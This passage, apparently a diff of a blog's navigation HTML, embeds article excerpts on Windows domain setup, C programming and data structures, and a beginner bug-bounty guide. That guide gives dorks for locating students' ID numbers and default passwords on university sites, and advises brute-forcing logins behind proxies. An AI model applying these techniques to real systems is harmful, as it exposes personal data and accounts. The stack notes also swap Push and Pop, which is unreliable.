+域控制器 域控制器（Domain Controller，DC）简称域控，是域环境核心的服务器计算机，用于在域中响应安全身份认证请求，负责允许或拒绝发出请求的主机访问域内资源，以及对用户进行身份验证、存储用户账户信息并执行域的安全策略等，域控包含一个活动目录数据库，其中存储着整个域的账户、密码、计算机等信息，而前面提到的身份验证便主要有以下步骤：
+该计算机是否属于本域 登录账号是否存在 密码是否正确 一个域环境可以拥有一台或多台域控制器，每台域控都各自存储了一份所在域的活动目录AD的可写副本，对AD的修改都可以从源域控同步复制到域、域树或域林的其他控制器上，这样即使其中一台域控瘫痪，另一台域控也可以继续工作，保证域环境正常运行
+一般情况下，DC也会被作为DNS服务器使用
+域环境搭建 主机准备 我准备了三台主机
+windows server 2019 datacenter windows 10 pro x64 windows 10 pro x64 配置域控 配置静态IP 打开控制面板中的网络设置，将IP配置为静态的192.168.111.100：
+">内网渗透基础知识</a>
+        
+      </div>
+    </li>
+  
+  
+  
+</ul>
+
+      </div>
+    </li>
+  
+</ul>
+
+      </div>
+    </li>
+  
+    <li>
+      <span class="tree-toggle collapsed"></span>
+      <span class="section-link" style="cursor: pointer;"><strong>安全管理</strong></span>
+      <div class="tree-children hidden" style="display: none;">
+        
+
+
+
+
+  
+  
+  
+    
+  
+
+
+<ul class="tree-list">
+  
+  
+  
+</ul>
+
+      </div>
+    </li>
+  
+    <li>
+      <span class="tree-toggle collapsed"></span>
+      <span class="section-link" style="cursor: pointer;"><strong>渗透实战</strong></span>
+      <div class="tree-children hidden" style="display: none;">
+        
+
+
+
+
+  
+  
+  
+    
+  
+
+
+<ul class="tree-list">
+  
+    <li>
+      <div class="tree-item-wrapper">
+        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
+        <a href="../../../../blog/%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/%E6%96%B0%E6%89%8B%E5%B0%8F%E7%99%BD%E4%B8%80%E4%B8%AA%E6%9C%88%E5%86%85%E6%8B%BF%E4%B8%8B%E4%B8%80%E5%BC%A0%E6%BC%8F%E6%B4%9E%E8%AF%81%E4%B9%A6/" class="article-link" data-summary="新手小白在一个月内拿下一张漏洞报送证书 如图所示，我从开始挖漏洞，在一个月内拿下了两个证书站以及三十多个rank。 作为一名见习白帽子，我使用的手段基本没有什么技术门槛，下面我就介绍一二。
+首先我认为不同的情况下的漏洞挖掘难度是不同的,通常是： 证书站点&amp;amp;gt;非证书站点&amp;amp;gt;有测试账号的站点
+一.没有测试账号的情况 没有测试账号，我们通常只能在这个网站的外围打转，功能点较少，耐心一些，可能很久都不会出结果或者重复不通过
+1.1 攻击面绘制 你的攻击范围越广就比别人多了更多的机会，这个时候需要先做一波攻击面绘制：
+1.1.1 查备案信息 比如南开大学的网站资产就能查到有8个域名 1.1.1 子域名收集 查到有8个域名之后，对每个域名做一次子域名收集，我常用的就是 oneforall 这个工具，可以看见南开一个一级域名就能查出一千多个子域名，当然工具都会有误报的现象，需要自己筛查，这里也推荐一个工具 aquatone ，能够把每一个url进去访问截图，你只用看截图就行了 1.2 简单三板斧 在外围挖，功能点少，测试技巧简单来说就三样
+1.2.1 抓包改包 对于你觉得存在参数传递的，可疑的信息传递过程，都可以进行抓包改包测试，如下图，就是仅通过学号参数传递就能获取身份证信息 1.2.2 未授权测试 未授权测试主要是路径的测试，一是对你觉得可能存在的路径做FUZZ,二是查看JS是否存在什么可疑路径，如下图1，即是成都信息工程大学的一个接口泄露，直接对应角色权限的Cookie,能够实现越权。如下图2，即是成都理工大学的一个未授权访问界面，能够直接以学生权限管理实习系统 1.2.3 sql注入测试 遇到可能存在与数据库交互的地方，先手动判断一下，然后进行自动化测试，使用自己收集的字典或者sqlmap之类的工具进行针对的测试，如下图是一个sql注入漏洞,注入点为userid 二.有测试账号的情况 2.1 获取一个测试账号 高校VPN登录存在的普遍问题就是弱口令，现目前大部分高校默认密码都采用了身份证后六位，用户名一般都是学号，最传统的获取方式就是要我们先做一波信息收集
+搜索谷歌黑语法：
+site:xxx.edu.cn sfz filetype: pdf|xls|doc site:xxx.edu.cn 初始密码 site:xxx.edu.cn xh 收集到一定的信息之后，即可对登录框进行爆破（有参数加密的做做js逆向，ip限制的挂挂代理，有验证码测试一下相关漏洞，不要高并发）
+或者发挥下你的人脉，直接把你好朋友的账号密码要过来即可
+2.2 进入后台 后台的功能点就太多了，过于冗杂，这里贴几个简单案例，慢慢感悟
+2.2.1 后台OA系统密码大量泄露 该接口泄露大量userid 该接口通过userid能够获取密码 2.2.2 后台人员管理越权篡改角色权限 附言 以上介绍的方法都是最基础的方法的运用，在实际过程中用到的各种小技巧要在挖掘过程中自行体会总结。 在开始挖漏洞之前，必要的基础知识（比如top10漏洞的测试方法）是一定要熟练掌握的，下面分享一张前置知识路线图。 还有，总是有人和我说挖不到漏洞，新手挖漏洞阶段，考的就是个细心，每天挖一两个小时不挖了，怎么会挖的到，建议一天要长时间的挖掘，盯着一个站点一直看才能够得到提高。
+">新手小白一个月内拿下一张漏洞证书</a>
+        
+      </div>
+    </li>
+  
+  
+  
+</ul>
+
+      </div>
+    </li>
+  
+    <li>
+      <span class="tree-toggle collapsed"></span>
+      <span class="section-link" style="cursor: pointer;"><strong>考研</strong></span>
+      <div class="tree-children hidden" style="display: none;">
+        
+
+
+
+
+  
+  
+  
+    
+  
+
+
+<ul class="tree-list">
+  
+  
+  
+    <li>
+      <span class="tree-toggle collapsed"></span>
+      <span class="section-link" style="cursor: pointer;"><strong>C语言</strong></span>
+      <div class="tree-children hidden" style="display: none;">
+        
+
+
+
+
+  
+  
+  
+    
+  
+
+
+<ul class="tree-list">
+  
+    <li>
+      <div class="tree-item-wrapper">
+        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
+        <a href="../../../../blog/%E8%80%83%E7%A0%94/c%E8%AF%AD%E8%A8%80/%E8%80%83%E7%A0%94%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84c%E8%AF%AD%E8%A8%80%E4%B8%8B/" class="article-link" data-summary="考研视角下的C语言(下) 第十二章_指针 指针是什么？指针保存的是一个地址，是用于存放内存地址的变量，它指向某个对象在内存中的起始地址（首地址）。
+12.1 指针变量的初始化 指针变量是依附于另外一个目标而存在的，所以先要给目标申请内存，再来创建一个指针变量。而我们都知道，指针变量存放的是目标在内存中的首地址，为了确定目标的实际大小，所以在创建指针变量的时候还需要确定基类型，以方便编译器在解引用和指针运算时确定访问的字节数。 这里解释下上面例子中出现的两个运算符：
+解引用符号 * ： 和 = 与 [] 类似，在不同的地方符号的含义不同，在“类型声明”里表示“指针类型”，在“表达式”里表示乘法和根据指针变量存储的地址值和指针的基类型取指向地址里的值 取地址符号 &amp;amp;amp; ： 在声明中只作为类型的一部分或语法连接符出现，本身不表示运算，在表达式里表示 “取某个对象的首地址”（生成一个指针值） 12.2 指针变量的使用 C语言中的指针存在非常多的用法，但是对于初学者来说，只用掌握两种就好了，即指针的传递和指针的偏移：
+12.2.1 指针的传递 指针的传递能够用来在被调函数的栈帧里修改主调函数栈帧的数据：
+主调函数给被修改的数据申请内存 被调函数以数据的指针作为参数 被调函数用解引用运算符去间接访问内存，修改内容 #define _CRT_SECURE_NO_WARNINGS #include &amp;amp;lt;stdio.h&amp;amp;gt; void swap(int *pa, int *qb) { int temp = *pa; *pa = *qb; *qb = temp; } int main() { int a = 5, b = 10; printf(&amp;amp;#34;swap函数调用前a=%d，b=%d\n&amp;amp;#34;, a, b); int *pa = &amp;amp;amp;a; int *qb = &amp;amp;amp;b; swap(pa, qb); printf(&amp;amp;#34;swap函数调用后a=%d，b=%d\n&amp;amp;#34;, a, b); return 0; } 12.2.2 指针的偏移 所谓指针的偏移就是对指针的变量做加减法（只能加减整数），实现连续内存单元的访问，通常和数组联系在一起。公式如下：
+指针p &#43; n = p里存储的地址 &#43; n * 基类型的大小 和之前讲的 [ ] 运算符很相似 12.2.3 指针的使用原则 指针的使用原则只有一个：先考虑目标是否存在，再使用指针。 比如下面这段代码，结合 10.2 函数运行的内存原理，10.4 生存期，其实这个局部数组在函数调用完成之后就被销毁了，那指向他的指针解引用也自然会出错： ">考研视角下的C语言(下)</a>
+        
+      </div>
+    </li>
+  
+    <li>
+      <div class="tree-item-wrapper">
+        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
+        <a href="../../../../blog/%E8%80%83%E7%A0%94/c%E8%AF%AD%E8%A8%80/%E8%80%83%E7%A0%94%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84c%E8%AF%AD%E8%A8%80%E4%B8%AD/" class="article-link" data-summary="考研视角下的C语言(中) 第七章_选择结构 7.1 if 的用法 单分支结构（if）：只有在条件为真时执行语句。 单分支结构（if）：只有在条件为真时执行语句。 多分支结构（if &#43; else if &#43; else）：用于多个条件的判断，依次匹配第一个为真的分支。 if 的分支结构用法如下：
+#define _CRT_SECURE_NO_WARNINGS #include &amp;amp;lt;stdio.h&amp;amp;gt; int main() { int score; printf(&amp;amp;#34;请输入分数：&amp;amp;#34;); scanf(&amp;amp;#34;%d&amp;amp;#34;, &amp;amp;amp;score); //if 和 else 后面不加 {} 匹配的都是单行语句，即使后面是单行语句建议还是加上 {} // --- 单分支：判断是否及格 --- if (score &amp;amp;gt;= 60) { printf(&amp;amp;#34;及格了！\n&amp;amp;#34;); } // --- 双分支：判断是否优秀 --- if (score &amp;amp;gt;= 90) { printf(&amp;amp;#34;优秀！\n&amp;amp;#34;); } else { printf(&amp;amp;#34;不是优秀。\n&amp;amp;#34;); } // --- 多分支：判断具体等级 --- if (score &amp;amp;gt;= 90) { printf(&amp;amp;#34;等级：A\n&amp;amp;#34;); } else if (score &amp;amp;gt;= 75) { printf(&amp;amp;#34;等级：B\n&amp;amp;#34;); } else if (score &amp;amp;gt;= 60) { printf(&amp;amp;#34;等级：C\n&amp;amp;#34;); } else { printf(&amp;amp;#34;等级：D\n&amp;amp;#34;); } return 0; } else 就近原则总结（重要！易错点）： 在C语言中else 永远匹配最近的、没有配对的 if，不是匹配上面缩进对齐的 if，别和python搞混了
+">考研视角下的C语言(中)</a>
+        
+      </div>
+    </li>
+  
+    <li>
+      <div class="tree-item-wrapper">
+        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
+        <a href="../../../../blog/%E8%80%83%E7%A0%94/c%E8%AF%AD%E8%A8%80/%E8%80%83%E7%A0%94%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84c%E8%AF%AD%E8%A8%80%E4%B8%8A/" class="article-link" data-summary=" 考研视角下的C语言(上) 当你想准备考研408，C语言就成了你绕不过去的专业课门槛，在考研中的复习C语言是复习408专业课的第一步， 区别于我们在大一学习的C语言，考研的C语言只需要学习到链表部分，但对在C语言的视角下对计算机的理解更加深入，以下内容仅适合有一些基础的同学，现将C语言重要知识点按照章节总结如下： 第一章_配置C语言开发环境 大一的时候应该配置过，我使用的是VS2022,具体配置与使用可参考如下文章。
+https://blog.csdn.net/Daears/article/details/126359972 https://blog.csdn.net/2401_87692645/article/details/148870278
+第二章_程序员视角中的计算机 2.1 如何设置断点进行程序的调试 如图所示，只用保留这几个窗口即可（打断点后F5即可跳转调试界面，然后手动在 调试-&amp;amp;gt;窗口 中设置需要的窗口，比如图中的内存窗口），该技巧会在考研学习的过程中不断地用到。 2.2 内存模型 在程序员的视角中看计算机，无非就两个东西，CPU和存储器，接下来介绍一个非常重要的存储器&amp;amp;ndash;内存。
+在vs2022的内存视角中有三列数据，第三列是把第二列的 16 进制数据转换成对应的 ASCII 字符（无法映射的字符用./?表示），不想管可以先不管。
+实际的内存模型只包含前面两列数据，内存地址和内存数据，一个内存单元占一个字节，下图第一列显示的都是多个连续的内存单元的起始地址，第二列显示的是连续存储的数据。 地址的二进制位数（宽度）直接决定了能表示的最大地址数量，进而决定了可访问的内存空间总大小
+32 位地址（32 位 CPU / 操作系统）总内存空间：2^32 字节 = 4GB（理论上限）
+64 位地址（当前主流 CPU / 操作系统）总内存空间：2^64 字节 = 16EB（理论上限）
+现目前的CPU只实现了 48 位地址线：2^48 字节 = 256TB （硬件上限）
+我们平常使用的电脑内存只有十几GB,主要是内存条贵和够用多方面原因。
+第三章_基础语法 3.1 空白字符 空白字符有三种：空格，制表符，换行。空白字符不会影响代码的结构，只是起到一个分隔的作用，即使你写成下图这样，在C语言中也能够进行编译。 3.2 注释 行注释：// //这是一行注释
+段注释：/**/ /*这是一\n段注释*/
+3.3 关键字和标识符 关键字：诸如 int return 等32个，为C语言定义好的，不能把这些当做标识符，大小写敏感
+标识符：以数字，下划线，字母组成（不能以数字开头，不能和关键字重复，大小写敏感），用于标识你自己定义的变量等，比如 Int,Return,_int 等。
+第四章_常量，变量和数据类型 4.1 字面值常量 4.1.1 定义 字面型常量 = 程序中直接写出来、值不会改变的量，写出来就知道是什么意思。
+">考研视角下的C语言(上)</a>
+        
+      </div>
+    </li>
+  
+  
+  
+</ul>
+
+      </div>
+    </li>
+  
+    <li>
+      <span class="tree-toggle collapsed"></span>
+      <span class="section-link" style="cursor: pointer;"><strong>数据结构</strong></span>
+      <div class="tree-children hidden" style="display: none;">
+        
+
+
+
+
+  
+  
+  
+    
+  
+
+
+<ul class="tree-list">
+  
+    <li>
+      <div class="tree-item-wrapper">
+        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
+        <a href="../../../../blog/%E8%80%83%E7%A0%94/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%8B%E6%8E%92%E5%BA%8F/" class="article-link" data-summary="数据结构之排序 第八章_排序 8.1 排序的基本概念 排序就是将表中的元素重新排列，使其按关键字有序的过程，也方便了后序的查找操作。
+算法的稳定性： 算法的稳定性不能用来衡量算法的优劣（不同场景需求不同）。衡量排序算法的性能指标主要是时间复杂度和空间复杂度，其概念如下图所示： 排序算法的分类：
+内部排序： 所有的元素都能放进内存中。 外部排序： 数据太多无法放入内存中，需要频繁在内、外存之间交换数据。 示意图如图所示： 这里推荐 旧金山大学(University of San Francisco) 开发的一个神奇的学习网站（末尾链接），可可视化查看各种算法。
+8.2 插入排序 这是一种简单直观的算法，其基本思想是：每次将一个待排序的记录，按其关键字大小插入到前面已经排好序的子序列中。
+8.2.1 直接插入排序 实现代码如下：
+//普通实现方式 void InsertSort(int A[], int n) { int i, j; for (i = 1; i &amp;amp;lt; n; i&#43;&#43;) { if (A[i] &amp;amp;lt; A[i - 1]) { int temp = A[i]; for (j = i - 1; j &amp;amp;gt;= 0 &amp;amp;amp;&amp;amp;amp; A[j] &amp;amp;gt; temp; j--) { A[j &#43; 1] = A[j]; } A[j &#43; 1] = temp; } } } //直接插入排序（带哨兵） void InsertSort(int A[], int n){ int i, j; for(i=2; i&amp;amp;lt;=n; i&#43;&#43;) //依次将A[2]~A[n]插入到前面已排序序列 if(A[i]&amp;amp;lt;A[i-1]){ //若A[i]关键码小于其前驱，将A[i]插入有序表 A[0]=A[i]; //复制为哨兵，A[0]不存放元素 for(j=i-1; A[0]&amp;amp;lt;A[j]; --j)//从后往前查找待插入位置 A[j&#43;1]=A[j]; //向后挪位 A[j&#43;1]=A[0]; //复制到插入位置 } } 对于直接插入排序性能分析如下：
+空间效率： 空间复杂度 O(1)。
+时间效率：
+最坏时间复杂度：时间复杂度为 O(n2)，发生 n (n - 1) / 2 即原始数据全部逆序的情况。 最好时间复杂度：时间复杂度为 O(n)，比较次数为 n - 1 次，即原始数据全部有序的情况。 平均时间复杂度：O(n2) 稳定性： 相同关键字的元素的相对顺序不会改变，直接插入排序是稳定的算法。
+">数据结构之排序</a>
+        
+      </div>
+    </li>
+  
+    <li>
+      <div class="tree-item-wrapper">
+        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
+        <a href="../../../../blog/%E8%80%83%E7%A0%94/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%8B%E6%9F%A5%E6%89%BE/" class="article-link" data-summary="数据结构之查找 第七章_查找 7.1 查找的基本概念 查找：在数据集合中寻找满足某种条件的数据元素的过程称为查找 查找表（查找结构）：用于查找的数据集合称为查找表，它由同一类型的数据元素（或记录）组成，不一定只用于查找，还可用于增加/删除等操作。查找表并不是一个单一的数据结构，可以是图、树、线性表&amp;amp;hellip; 关键字：数据元素中唯一标识该元素的某个数据项的值，使用基于关键字的查找，查找结果应该是唯一的。 静态查找表： 查找表在使用期间数据元素固定不变，仅支持查找操作，不进行频繁的插入或删除。 动态查找表： 查找表在使用期间数据元素可以动态增加或删除，支持查找、插入和删除等操作。 查找长度： 在查找运算中，需要对比关键字的次数称为查找长度 平均查找长度（ASL, Average Search Length）： 所有查找过程中进行关键字的比较次数的平均值，ASL 是各元素查找长度与其被查找概率（默认各元素相同）的加权平均值，其数学定义为： $$ \text{ASL} = \sum_{i=1}^{n} L_i \cdot p_i $$ 默认情况为： $$ \text{ASL} = \frac{1}{n} \sum_{i=1}^{n} L_i $$ 查找表中有 n 个元素，第 i 个元素查找长度为 Li ，查找概率为 Pi（各元素之和为 1），ASL 是衡量查找算法效率的核心指标。 7.2 线性表查找 线性表查找指 “查找表” 是线性表的查找。
+7.2.1 顺序查找 所谓顺序查找，就是我们最熟悉的从头到尾去挨个匹配关键字。
+7.2.1.1 一般顺序查找 普通顺序查找的实现方式很简单，代码如下：
+typedef struct{ ElemType *elem; //这里可以用动态数组的方式实现，省略了一些代码 int TableLen; }SSTable; //顺序查找 int Search_Seq(SSTable ST,ElemType key){ int i; for(i=0;i&amp;amp;lt;ST.TableLen &amp;amp;amp;&amp;amp;amp; ST.elem[i]!=key; &#43;&#43;i); //判断是否越界，判断是否查找成功 //查找成功，则返回元素下标；查找失败，则返回-1 return i==ST.TableLen? -1 : i; } 7.2.1.2 哨兵模式顺序查找 我们将待查找的关键字放在数组下标为 0 的位置，数据从下标为 1 的位置开始存储，从后往前顺序查找。这样便不用每次都判断是否越界，因为遍历到下标为 0 的位置会自动停下来。我们将下标为 0 位置对应元素称之为哨兵，实现代码如下：
+">数据结构之查找</a>
+        
+      </div>
+    </li>
+  
+    <li>
+      <div class="tree-item-wrapper">
+        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
+        <a href="../../../../blog/%E8%80%83%E7%A0%94/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%8B%E5%9B%BE/" class="article-link" data-summary="数据结构之图 第六章_图 6.1 图的基本概念 图 G 由顶点集 V（vertex） 和边集 E（edge） 组成，记为 G = (V,E)。若 V = {v1,v2,v3&amp;amp;hellip;vn}，则用 |v| 表示图 G 中顶点的数量；若 E = {(u,v)|$u \in V$,$v \in V$}，则用 |E| 表示图 G 中边的数量。
+注意：线性表能够是空表，树能够是空树，但是图不能是空图，顶点集必须非空，边集可以为空。在图中，每一条边都必须依附于两个顶点；而顶点可以不与任何边相连（称为孤立顶点）。
+6.2 图的基本术语 很杂，思维导图如下： 6.2.1 有向图和无向图 弧头弧尾别搞反了！箭头那头是弧头！！ 6.2.2 简单图和多重图 6.2.3 顶点 关于顶点主要就是顶点的度、入度和出度。 在无向图中：顶点的度是指依附于该顶点的边的数量（无入度和出度之分），记为 TD(v)。全部顶点的度数之和等于边数的两倍。 在有向图中：顶点的度分为入度和出度，入度就是该点是多少个弧头，记为 ID(v)，出度就是该点是多少个弧尾，记为 OD(v)。当然 TD(v) = ID(v) &#43; OD(v)。 6.2.4 边的权，带权图 / 网 边上带权值的图被称为带权图，也称为网。 6.2.5 点与点间的关系 6.2.5.1 一堆描述 好杂啊，没事过来看看.. 6.2.5.2 连通图与强连通图 注意在无向图中才讨论连通性，在有向图中才考虑强连通性。 6.2.6 图的局部 6.2.6.1 子图 注意划分的子图，一定要是个图。 ">数据结构之图</a>
+        
+      </div>
+    </li>
+  
+    <li>
+      <div class="tree-item-wrapper">
+        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
+        <a href="../../../../blog/%E8%80%83%E7%A0%94/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%8B%E6%A0%91%E4%B8%8E%E4%BA%8C%E5%8F%89%E6%A0%91/" class="article-link" data-summary="数据结构之树与二叉树 第五章_树与二叉树 5.1 树 5.1.1 树的定义 树是 n (n&amp;amp;gt;=0) 个结点的有限集。当 n 等于 0 时，称作空树
+树属于数据结构三要素中：逻辑结构 → 非线性结构 → 树形结构。在任意一棵非空树中必须满足：
+有且仅有一个特定的结点称作根结点。 当 n &amp;amp;gt; 1 时，除根结点的其余结点可分为 m（m&amp;amp;gt;0）个互不相交的有限集，其中每个集合本身又是一棵树，称为根的子树。 显然非空树是递归定义的。（每个子树本身又是一棵树，用树来定义树，典型的递归定义），而更具以上定义我们能推出以下两个特征：
+根结点没有前驱，除根结点外的每个结点都有且仅有一个前驱 每个结点都可能有零个或者多个后继结点。 错误示意如下： 5.1.2 树的基本术语 祖先，子孙，双亲，孩子，兄弟和堂兄弟结点： 从根结点到该结点路径上的所有结点（不包括该结点本身），称为该结点的祖先结点。某结点的所有后代结点，称为该结点的子孙结点。
+结点的层次，深度和高度： 结点的层次从根开始定义，根为第一层，其孩子结点为第二层，以此类推。结点的深度即为其所在的层次。结点的高度是以其为根的子树的高度，如上图树的高度为。 路径和路径长度： 路径是指从一个结点到另一个结点，沿父子关系依次经过的结点序列（包括起始和结束结点）。路径长度是路径上边的数目。（路径是没有方向的，但是涉及到层次，深度，高度等概念时，默认是从上到下，而此时不考虑从下到上的路径） 结点的度和树的度： 树中一个结点的孩子结点的个数称为结点的度。树中所有结点的度的最大值称为树的度。结点的度为 0 的结点为叶结点，结点的度 &amp;amp;gt;0 的结点为分支结点（包括根结点） 有序树和无序树： 具体要看用树来存储些什么，各结点的子树从左到右是否存在逻辑次序关系，存在即为有序树，反之则为无序树。 森林： 森林是 m（m &amp;amp;gt;= 0）个不相交的树的集合。m = 0 时的情况叫做空森林。与树的概念密切相关。把树的根结点移除，其子树构成森林；给森林加一个根结点，森林便转化为一棵树。
+5.1.3 树的性质（常考点） 下面介绍几个在考研中常考的性质：
+树的结点的个数 = 树的总度数 &#43; 1 （根结点） 树的度为 m 和 m 叉树的区别（m &amp;amp;gt;= 1)：树的度为 m 代表至少有 m&#43;1 个结点（一定非空树），且至少有一个结点的度为 m 所有结点的度都 &amp;amp;lt;= m；m 叉树代表可以为空树，允许所有结点的度 &amp;amp;lt;= m。 m 叉树和树的度为 m 的第 i 层都最多有 m i-1 个结点。 高度为 h 的 m 叉树的最多有 (m h - 1) / (m - 1) 个结点（等比数列求和） 高度为 h 的 m 叉树至少有 h 个结点，高度为 h 的度为 m 的树至少有 h &#43; m - 1个结点。 具有 n 个结点的 m 叉树的最小高度为 $$ h = \left\lceil \log_{m}\bigl(n(m-1)&#43;1\bigr) \right\rceil $$ 即要求最小的整数 ( h )，使得
+$$ \frac{m^{,h-1}-1}{m-1} &amp;amp;lt; n \le \frac{m^{,h}-1}{m-1} $$ 5.2 二叉树 5.2.1 二叉树的概念 二叉树是一种特殊的树形结构，是包含 n （n &amp;amp;gt;= 0）个结点的有限集合，其核心特征在于：每个结点至多拥有两棵子树。
+">数据结构之树与二叉树</a>
+        
+      </div>
+    </li>
+  
+    <li>
+      <div class="tree-item-wrapper">
+        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
+        <a href="../../../../blog/%E8%80%83%E7%A0%94/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%8B%E4%B8%B2/" class="article-link" data-summary="数据结构之串 第四章_串 4.1 串的定义 串（string） 是由零个或多个字符组成的有限序列（就是我们常说的字符串）通常记为：
+S = &amp;#39;a₁ a₂ … aₙ&amp;#39;（n ≥ 0）
+其中，S 是串名，单（双）引号括起的字符序列是串的值（单双引号取决于语言，比如python用单引号，C语言用双引号），每个 aᵢ 可以是字母、数字或其他字符，串中字符的个数 n 称为串的长度，当 n = 0 时，该串称为空串，用 ∅ 表示。
+实际上串也是一种特殊的线性表，其特殊性体现在：串的元素类型限定为字符，且其基本运算主要是子串操作（如模式匹配），而不是一般线性表的插入和删除操作。 下面是子串相关的定义，用举例说明：
+S=&amp;amp;#34;HelloWorld!&amp;amp;#34; T=&amp;amp;#39;iPhone 18 Pro Max?&amp;amp;#39; 子串： 串中任意个连续的字符组成的子序列（可以等于主串）。 Eg: &amp;amp;lsquo;iPhone&amp;amp;rsquo;, &amp;amp;lsquo;Pro M&amp;amp;rsquo; 是串 T 的子串 主串： 包含子串的串。 Eg: T 是子串 &amp;amp;lsquo;iPhone&amp;amp;rsquo; 的主串 字符在主串中的位置： 字符在串中的序号。 Eg: &amp;amp;lsquo;8&amp;amp;rsquo; 在 T 中的位置是 9 （注意这里指的是位序） 子串在主串中的位置： 子串的第一个字符在主串中的位置。 Eg: &amp;amp;lsquo;11 Pro&amp;amp;rsquo; 在 T 中的位置为 8 （注意这里指的是位序）
+4.2 串的基本操作 串的基本操作不做过多解释，基本和平常使用的C语言中string库中函数的作用相同，其函数规范如下：
+StrAssign (&amp;amp;amp;T,chars): 赋值操作。把串 T 赋值为 chars。 StrCopy (&amp;amp;amp;T,S): 复制操作。由串 S 复制得到串 T。 StrEmpty (S): 判空操作。若 S 为空串，则返回 TRUE，否则返回 FALSE。 StrLength (S): 求串长。返回串 S 的元素个数。 ClearString (&amp;amp;amp;S): 清空操作。将 S 清为空串（逻辑上清空，并没有回收空间）。 DestroyString (&amp;amp;amp;S): 销毁串。将串 S 销毁（回收存储空间）。 Concat (&amp;amp;amp;T,S1,S2): 串联接。用 T 返回由 S1 和 S2 联接而成的新串 SubString (&amp;amp;amp;Sub,S,pos,len): 求子串。用 Sub 返回串 S 的第 pos 个字符起长度为 len 的子串。 Index (S,T): 定位操作。若主串 S 中存在与串 T 值相同的子串，则返回它在主串 S 中第一次出现的位置；否则函数值为 0。 StrCompare (S,T): 比较操作。若 S&amp;amp;gt;T，则返回值 &amp;amp;gt; 0；若 S=T，则返回值 = 0；若 S &amp;amp;lt; T，则返回值 &amp;amp;lt; 0。 4.3 串的存储结构 既然是串是一种特殊的线性表，其实现方式我们自然能想到两种即顺序存储和链式存储：
+">数据结构之串</a>
+        
+      </div>
+    </li>
+  
+    <li>
+      <div class="tree-item-wrapper">
+        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
+        <a href="../../../../blog/%E8%80%83%E7%A0%94/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%8B%E6%A0%88%E9%98%9F%E5%88%97%E5%92%8C%E6%95%B0%E7%BB%84/" class="article-link" data-summary="数据结构之栈、队列和数组 第三章_栈、队列和数组 本章介绍的两种数据结构栈和队列在逻辑结构上都属于线性结构，只不过是操作受限的线性表。
+3.1 栈 3.1.1 栈的基本概念 栈（stack） 是仅允许在一端进行插入和删除操作的线性表。
+在写C语言时，函数销毁创建本质就是依赖于栈这一数据结构。特点是后进先出（Last In First Out，LIFO） 下面介绍栈的三个基本属性以及示意图：
+栈顶（Top）： 允许进行插入和删除操作的这一端。 栈底（Bottom）： 固定不变，不允许进行插入和删除操作的这一端。 空栈： 不含任何元素的栈。 3.1.2 栈的基本操作 采用严蔚敏版的命名规范：
+InitStack(&amp;amp;amp;S)：初始化一个空栈S。 DestroyStack(&amp;amp;amp;S)：销毁栈S，释放其存储空间。 Pop(&amp;amp;amp;S,x)：入栈操作，若栈未满，则x成为新的栈顶元素。 Push(&amp;amp;amp;S,x)：出栈操作，若栈非空，则弹出栈顶元素，并通过x返回该值。 GetTop(S,&amp;amp;amp;x)：读取栈顶元素但不出栈，若栈非空，则通过x返回值。 StackEmpty(S)：判断栈是否为空，为空返回True，否则返回False。 3.1.3 栈的数学性质 栈的数学性质： 当n个不同的元素按固定次序入栈时，可能的出栈序列的总数为 1/(n&#43;1)Cn2n，该数列也被称为卡特兰数。（做题时很好用）
+3.1.4 顺序栈 3.1.3.1 顺序栈的定义 采用顺序存储的栈称为顺序栈，它利用一组连续的存储单元存放从栈顶到栈底的数据元素，并附设一个整型指针（top） 指向当前栈顶元素位置。
+与线性表类似，栈也有两种基本的存储方式：顺序存储和链式存储。
+3.1.3.2 顺序栈的实现和基本操作 下面介绍顺序栈。基于top指针的指向方式，栈其实存在两种操作方式：1. top 表示当前栈顶元素的下标，2. top 表示“下一个可存放元素的位置”。由于和《数据结构之绪论与线性表》中的代码大致都相同，也很简单，这里直接用代码说明顺序栈的实现和基本操作。
+1. top 表示当前栈顶元素的下标: 注意top指针在这种情况下初始化为 -1。在做题时，S.data[&#43;&#43;top]; 等代码的 &#43;&#43;top 和 top&#43;&#43;，两种情况表示不同，一定理解记忆是哪种情况。
+#define _CRT_SECURE_NO_WARNINGS #include &amp;amp;lt;stdio.h&amp;amp;gt; #include &amp;amp;lt;stdlib.h&amp;amp;gt; # define MaxSize 50 typedef struct { Elemtype data[MaxSize]; int top; }SqStack; void InitStack(SqStack&amp;amp;amp; S) { S.top = -1; //注意这里初始化为-1 } bool StackEmpty(SqStack &amp;amp;amp;S) { if (S.top == -1) { return true; } return false; } bool Push(SqStack &amp;amp;amp;S, Elemtype x) { if (S.top == MaxSize - 1) { //栈满，不能插入 return false; } //下面两行等价于S.data[&#43;&#43;top]=x; 做题时注意区分 S.top&#43;&#43;; S.data[S.top] = x; return true; } bool Pop(SqStack&amp;amp;amp; S, Elemtype &amp;amp;amp;x) { if (S.top == -1) { //栈为空，无法删除 return false; } x = S.data[S.top--]; 